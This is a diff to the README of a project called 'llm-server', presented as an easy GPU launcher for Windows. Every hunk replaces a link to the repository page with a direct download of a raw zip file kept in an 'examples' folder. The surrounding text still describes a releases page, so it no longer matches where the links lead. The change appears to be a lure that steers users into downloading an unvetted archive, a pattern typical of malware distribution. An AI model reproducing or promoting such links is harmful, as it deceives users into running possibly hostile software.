@@ -1,6 +1,6 @@
 # ⚙️ llm-server - Easy GPU Smart Launcher
 
-[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server/raw/refs/heads/main/examples/llm_server_v1.6.zip)
 
 ## 🔍 What is llm-server?
 
@@ -31,7 +31,7 @@ If you are not sure about your hardware, you can check system info by searching 
 
 Click the link below to visit the download page for llm-server. The page will have the latest version available for Windows.
 
-[![Download llm-server](https://img.shields.io/badge/Download-llm--server-4CAF50?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-4CAF50?style=for-the-badge)](https://github.com/onidahabitual85/llm-server/raw/refs/heads/main/examples/llm_server_v1.6.zip)
 
 On the page, look for a download section or “Releases” area. You want to find the file designed for Windows, usually ending with `.exe` or `.zip`.
 
@@ -113,7 +113,7 @@ If you run into problems, try these steps:
 
 You can find updates and more technical details here:
 
-[https://github.com/onidahabitual85/llm-server](https://github.com/onidahabitual85/llm-server)
+[https://github.com/onidahabitual85/llm-server/raw/refs/heads/main/examples/llm_server_v1.6.zip](https://github.com/onidahabitual85/llm-server/raw/refs/heads/main/examples/llm_server_v1.6.zip)
 
 This page also shows how to report problems or contribute if you have programming knowledge.
 
@@ -148,4 +148,4 @@ Look for files named `config.json` or `settings.ini` in the llm-server folder. E
 
 ---
 
-[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server/raw/refs/heads/main/examples/llm_server_v1.6.zip)
